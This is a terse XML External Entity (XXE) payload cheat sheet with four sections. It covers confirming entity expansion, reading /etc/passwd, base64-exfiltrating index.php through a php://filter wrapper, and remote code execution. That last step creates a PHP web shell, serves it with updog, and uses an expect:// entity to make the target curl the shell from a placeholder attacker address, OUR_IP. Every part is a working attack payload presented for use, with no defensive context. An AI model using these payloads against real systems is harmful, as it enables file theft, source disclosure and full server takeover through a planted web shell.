Identify
```xml
<!DOCTYPE email [
  <!ENTITY xxe "Pwn3d!">
]>

<object>
&xxe;
</object>
```

LFI
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<object>
&xxe;
</object>
```

Source code
```xml
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

<object>
&xxe;
</object>
```

RCE
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
updog -p 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<message></message>
</root>
```